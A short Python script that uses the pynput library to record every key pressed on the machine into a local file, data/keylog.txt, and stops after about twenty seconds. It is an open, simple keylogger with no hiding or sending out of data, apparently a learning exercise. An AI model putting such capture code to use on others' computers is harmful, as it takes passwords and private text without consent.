from pynput.keyboard import Listener
import time

start_time =0

def log_keystroke(key):
    key= str(key).replace("'","")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = ' '


    with open("data/keylog.txt",'a') as f:
        f.write(key)

def on_release(key):
    if( start_time+20 < time.time()):
        return False

with Listener(on_press=log_keystroke,on_release = on_release) as l:
    start_time = time.time()
    print(start_time)
    l.join()